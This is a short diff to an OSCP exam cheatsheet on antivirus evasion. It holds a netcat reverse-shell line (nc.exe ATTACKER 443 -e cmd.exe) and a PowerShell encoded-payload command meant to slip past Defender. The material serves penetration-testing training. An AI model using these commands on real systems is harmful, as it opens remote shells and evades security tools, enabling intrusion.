@@ -9,7 +9,7 @@ summary: "Collection of antivirus evasion techniques for when Defender blocks yo
 Techniques for evading antivirus on OSCP targets. Rarely needed, but they save you when Defender blocks a payload.
 
 - Source: https://heretek.dev/oscp-cheatsheet/av-evasion/ (Jean Romero) — Reconstructed
-- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP (`ATTACKER` in the examples means the same Kali IP)
 
 - Exam rules: Custom scripts and manual bypasses are allowed. Commercial tools (Cobalt Strike, etc.) are prohibited.
 
@@ -19,7 +19,7 @@ Techniques for evading antivirus on OSCP targets. Rarely needed, but they save y
 Payload blocked by AV?
   │
   ├── Try nc.exe first (rarely flagged)
-  │     C:\Windows\Temp\nc.exe ATTACKER PORT -e cmd.exe
+  │     C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe
   │
   ├── Try PowerShell in-memory (no file on disk)
   │     powershell -e <BASE64_PAYLOAD>
